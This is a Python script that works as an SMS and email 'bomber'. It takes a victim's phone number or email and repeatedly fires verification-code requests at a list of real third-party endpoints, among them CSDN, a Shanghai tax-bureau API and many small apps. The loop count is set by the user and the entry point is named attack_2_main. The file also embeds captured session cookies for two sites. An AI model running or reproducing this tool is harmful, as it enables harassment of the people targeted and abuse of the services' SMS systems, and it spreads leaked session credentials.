import requests
import re

def is_valid_mobile_number(mobile_number):
    pattern = re.compile(r"^1[3-9]\d{9}$")
    return pattern.match(mobile_number)

def is_valid_email(email):
    pattern = re.compile(r"^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$")
    return pattern.match(email)

def send_sms_verification(user_input, interfaces, loop_count=1):
    if is_valid_mobile_number(user_input):
        target_type = "mobile"
    elif is_valid_email(user_input):
        target_type = "email"
    else:
        print("手机号或邮箱格式错误，请输入有效的手机号或邮箱。")
        return

    for i in range(loop_count):
        for interface in interfaces:
            if target_type == "mobile" and "payload" in interface and "mobile" in interface["payload"]:
                url = interface["url"]
                headers = interface["headers"]
                payload = interface["payload"]

                if headers.get("Content-Type") == "application/json;charset=UTF-8":
                    payload["mobile"] = user_input
                    response = requests.post(url, headers=headers, json=payload)
                else:
                    payload_str = "&".join([f"{key}={value}" for key, value in payload.items()])
                    payload_str = payload_str.replace("mobile=", f"mobile={user_input}")
                    response = requests.post(url, headers=headers, data=payload_str)

                if response.status_code == 200:
                    print(f"成功发送验证码到接口 {url}")
                    try:
                        print("响应内容:", response.json())
                    except requests.exceptions.JSONDecodeError:
                        print("响应内容不是有效的 JSON:", response.text)
                else:
                    print(f"发送验证码失败到接口 {url}")
                    print("响应码:", response.status_code)
                    print("响应内容:", response.text)

            elif target_type == "email" and "payload" in interface and "email" in interface["payload"]:
                url = interface["url"]
                headers = interface["headers"]
                payload = interface["payload"]

                if headers.get("Content-Type") == "application/json;charset=UTF-8":
                    payload["email"] = user_input
                    response = requests.post(url, headers=headers, json=payload)
                else:
                    payload_str = "&".join([f"{key}={value}" for key, value in payload.items()])
                    payload_str = payload_str.replace("email=", f"email={user_input}")
                    response = requests.post(url, headers=headers, data=payload_str)

                if response.status_code == 200:
                    print(f"成功发送验证码到接口 {url}")
                    try:
                        print("响应内容:", response.json())
                    except requests.exceptions.JSONDecodeError:
                        print("响应内容不是有效的 JSON:", response.text)
                else:
                    print(f"发送验证码失败到接口 {url}")
                    print("响应码:", response.status_code)
                    print("响应内容:", response.text)

            elif target_type == "mobile" and "dynamic" in interface:
                url = interface["url"].replace("{mobile}", user_input)
                response = requests.get(url)

                if response.status_code == 200:
                    print(f"成功发送验证码到接口 {url}")
                    try:
                        print("响应内容:", response.json())
                    except requests.exceptions.JSONDecodeError:
                        print("响应内容不是有效的 JSON:", response.text)
                else:
                    print(f"发送验证码失败到接口 {url}")
                    print("响应码:", response.status_code)
                    print("响应内容:", response.text)

interfaces = [
    {
        "url": "https://passport.csdn.net/v1/login/sendVerifyCode",
        "headers": {
            "Host": "passport.csdn.net",
            "Connection": "keep-alive",
            "Content-Length": "103",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Android WebView";v="126"',
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json;charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "sec-ch-ua-mobile": "?1",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; PHW110 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.134 Mobile Safari/537.36",
            "sec-ch-ua-platform": '"Android"',
            "Origin": "https://passport.csdn.net",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://passport.csdn.net/waplogin?from=https%3A%2F%2Fblog.csdn.net%2Fm0_58010546%2Farticle%2Fdetails%2F135354484&iframe=true&newframe=true&parentWidth=360&version=popupv10s&nickname=undefined&spm=1001.2101.3001.7902",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
            "Cookie": "dc_sid=091e954af9a7bcf6a29f625fcd84598f; uuid_tt_dd=11_37831936142-1712744929818-194348; c_segment=12; __gads=ID=da5e49dff810ed6a:T=1712744931:RT=1712744931:S=ALNI_MZOqNTrcr_TDeOwe0RJvinX1jgEWw; __gpi=UID=00000de64dcc3307:T=1712744931:RT=1712744931:S=ALNI_MbCQoZMlMGLlzBiVyY5gDFwgkTRcg; __eoi=ID=d1cff9221c6bb5e6:T=1712744931:RT=1712744931:S=AA-AfjYlj0KByNvARp6qvXwZDG8u; ssxmod_itna=QqUx2iGQeiqmT4Dq0dIO+Qd9dgtDcG1OD0vhYGzDAxn40iDt=cRDGqpW47m=roXxTKD0IYp02AW2weZWSYpdD74i8DCqi1D0qDYD4MdDgDQ93+QI7k4GGDiI7Dp1P0k1xG4DfDneGWS+F4Ta4DrpcHD0KOnxikQtr43PgeWWoWaeOeQQierQi47SOetieNmGxfrj5raGhDD=; ssxmod_itna2=QqUx2iGQeiqmT4Dq0dIO+Qd9dgtDcGODi5ikeD9e2D0y+x03GoQ2fj6KG2qZtXCeqidM+xD5q6KI0H+wE+p0GLh/3KTuReOuSDeoDwrDexGrmISBjx9YkFHNfuQj90fFAZBtOFi5wMo4U2hcb7PDFqD2+iD=; tfstk=fcAIsFmnPwJwroL1q93wlCAozffeFHG4Pz_JoUFUy6CL2uLAbBPEqUJ6Fn8Avp3Ky56MwiZ8JQTuNaLJq2jr-A8H-_f-0mRSgeYhIWpnbc5-yFHzIyqigj8HJZgnIlhqrJl7-gsRw9BdB1IGuaC8pT31Xa_0ekKRwVTOjaZ8Jged6FQhJ7dJ-k_gPi8IqscUFqij1es_wSa5R9IriGV8wC_B3iLKl7FJ1w6HahRA4GfWeEv5w1i7wNvePTRO-bZfSdLDtLLI1mLh1MxdApn71GJ2kBsyCSSXUJy7EMF55ius582z426xEfghudBdSN5r5Vwyt9QG5ius582lpNbMEVg_UBf..; Hm_up_6bcd52f51e9b3dce32bec4a3997715ac=%7B%22islogin%22%3A%7B%22value%22%3A%220%22%2C%22scope%22%3A1%7D%2C%22isonline%22%3A%7B%22value%22%3A%220%22%2C%22scope%22%3A1%7D%2C%22isvip%22%3A%7B%22value%22%3A%220%22%2C%22scope%22%3A1%7D%7D; _ga_7W1N0GEY1P=GS1.1.1715681621.2.1.1715682331.60.0.0; _ga=GA1.2.809078019.1715678573; c_first_ref=m.baidu.com; HMACCOUNT=DA2D270F3061E1E9; c_dl_prid=-; c_dl_rid=1720098104723_882636; c_dl_fref=https://bbs.csdn.net/; c_dl_fpage=/m/download/antisnow/89429695; c_dl_um=-; _clck=1np59uo%7C2%7Cfn6%7C0%7C1646; dc_session_id=10_1721467224079.769972; Hm_lvt_6bcd52f51e9b3dce32bec4a3997715ac=; Hm_lpvt_6bcd52f51e9b3dce32bec4a3997715ac=1721467225; c_pref=https%3A//m.baidu.com/from%3D1015011n/bd_page_type%3D1/ssid%3D0/uid%3D0/pu%3Dusm%254014%252Csz%25401320_1001%252Cta%2540iphone_2_13.0_24_126.0/baiduid%3D76F1BC55B1BE25C75EE6336D62ACFB1B/w%3D30_10_/t%3Diphone/l%3D1/tc; c_ref=https%3A//m.baidu.com/from%3D1015011n/bd_page_type%3D1/ssid%3D0/uid%3D0/pu%3Dusm%25409%252Csz%25401320_1001%252Cta%2540iphone_2_13.0_24_126.0/baiduid%3D76F1BC55B1BE25C75EE6336D62ACFB1B/w%3D0_10_/t%3Diphone/l%3D1/tc; c_first_page=https%3A//blog.csdn.net/m0_58010546/article/details/135354484; c_dsid=11_1721467224592.353732; https_waf_cookie=fc28c711-0468-47476bd845871eb102d958d35db4f47c2870; c_page_id=default; log_Id_pv=15; c-login-auto=14; popTimes=one; loginbox_wap_strategy=%7B%22taskId%22%3A308%2C%22abCheckTime%22%3A1721467224759%2C%22version%22%3A%22exp1%22%2C%22blog-wap-auto%22%3A1721467224761%7D; popShowed10s=yes; log_Id_click=62; SESSION=9340cee4-9075-4fc5-8ba9-80bc5faf7834; log_Id_view=195; dc_tos=sgx0mm"
        },
        "payload": {
            "code": "0086",
            "platform": "WAP",
            "type": "popupLogin",
            "spm": "1001.2101.3001.7902",
            "mobile": ""
        }
    },
    {
        "url": "https://zmingcx.com/wp-content/themes/begin/mail-captcha.php?0.17748457886315183",
        "headers": {
            "Host": "zmingcx.com",
            "Connection": "keep-alive",
            "Content-Length": "62",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Android WebView";v="126"',
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "sec-ch-ua-mobile": "?1",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; PHW110 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.134 Mobile Safari/537.36",
            "sec-ch-ua-platform": '"Android"',
            "Origin": "https://zmingcx.com",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://zmingcx.com/favorites/%E5%85%8D%E8%B4%B9%E5%9B%BE%E5%BA%8A/",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
            "Cookie": "PHPSESSID=315kadpa5d5nd5dtb6oa2fi0pn"
        },
        "payload": {
            "action": "eer_captcha",
            "email": "",
            "user_name": "kisskdk"
        }
    },
    {
        "url": "https://shanghai.chinatax.gov.cn/jkfw/api/v1.0/services/ssqh/sendCrcByPhoneNum?phoneNum={mobile}",
        "dynamic": True
    },
    {
        "url": "https://mei.damei100.com/wxmini/login/yzm?unionid=on9kC5gGYH0ZJiR5IQlbPtCV_WII&mobile={mobile}&lat=66.888888&lng=888.66666&designation=hsxiongdi712015",
        "dynamic": True
    },
    {
        "url": "https://pay.hebcz.cn/applet/send/number?mobile={mobile}",
        "dynamic": True
    },
    {
        "url": "https://great.minxundianzi.com/greatweb/great/user/sendSmsCode?countryCode=86&userTel={mobile}&type=1",
        "dynamic": True
    },
    {
        "url": "https://uchos-mini.ligeit.com/login/getVerifyCode?mobile={mobile}",
        "dynamic": True
    },
    {
        "url": "https://api.huandian.cloud/sms?phone={mobile}&serverKey=qishou",
        "dynamic": True
    },           
    {
        "url": "https://api.xuribiao.cn/api.php?s=login/get_code&mobile={mobile}",
        "dynamic": True
    },           
    {
        "url": "https://api.xuribiao.cn/api.php?s=login/get_code&mobile={mobile}",
        "dynamic": True
    },           
    {
        "url": "https://uc.17win.com/sms/v4/web/verificationCode/send?mobile={mobile}&scene=bind&isVoice=N&appId=08100110010000",
        "dynamic": True
    },           
    {
        "url": "https://apis.niuxuezhang.cn/v1/sms-code?phone={mobile}",
        "dynamic": True
    },           
    {
        "url": "https://dss.xiongmaopeilian.com/student_wx/student/send_sms_code?country_code=86&mobile={mobile}",
        "dynamic": True
    },           
    {
        "url": "https://admin.zhongrongtang.cn/qbb-gateway/mall/api/lerr/sms/new/sendSmsCode?phone={mobile}&sign=knd112211!",
        "dynamic": True
    }           
]

def attack_2_main():
    user_input = input("请输入手机号或邮箱: ")
    loop_count = int(input("请输入循环次数: "))
    send_sms_verification(user_input, interfaces, loop_count)